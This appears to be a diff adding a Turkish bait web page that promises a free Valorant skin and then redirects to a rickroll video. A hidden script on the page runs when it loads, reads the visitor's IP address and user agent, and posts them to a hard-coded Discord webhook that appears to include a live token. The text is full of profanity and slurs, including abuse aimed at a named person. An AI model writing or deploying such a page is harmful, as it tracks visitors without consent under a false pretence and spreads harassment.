@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Bedava Valorant Skin Geldi Amk Tıkla Lan</title>
+    <meta http-equiv="refresh" content="2;url=https://www.youtube.com/watch?v=dQw4w9WgXcQ"> <!-- rickroll yap seni mal -->
+    <style>body{background:#000;color:#f00;font-size:50px;text-align:center;padding:200px;}</style>
+</head>
+<body>
+    <h1>TEBRİKLER ŞEREFSİZ! ÜCRETSİZ VİTİLAN SKİN KAZANDIN!</h1>
+    <p>Tıkla hemen al piç, yoksa başkası kapar</p>
+
+    <script>
+    const webhook = "https://discord.com/api/webhooks/1462519215515762872/z4PLUrooMdCD4O6ARjXVwgaq27XQYzT0v87C-HFipgKDa7kGQGFN5rFkkRlGp2OmKE7R"; // Discord'dan webhook al lan aptal
+
+    async function logla() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            const ip = data.ip || 'IP alamadı mal';
+
+            const info = {
+                content: `Yeni mal tıkladı amk!\nIP: ${ip}\nZaman: ${new Date().toLocaleString('tr-TR')}\nBrowser: ${navigator.userAgent}\nAdana’nın en ezik orospu evladı Elyasa logladı piç`,
+                username: "IP Avcısı Elyasa",
+                avatar_url: "https://i.imgur.com/sikinti.png" // bok atarsın
+            };
+
+            await fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(info)
+            });
+        } catch(e) {
+            // siktir et hata verse de
+        }
+    }
+
+    logla(); // Sayfa açılır açılmaz logla piç
+    </script>
+</body>
+</html>
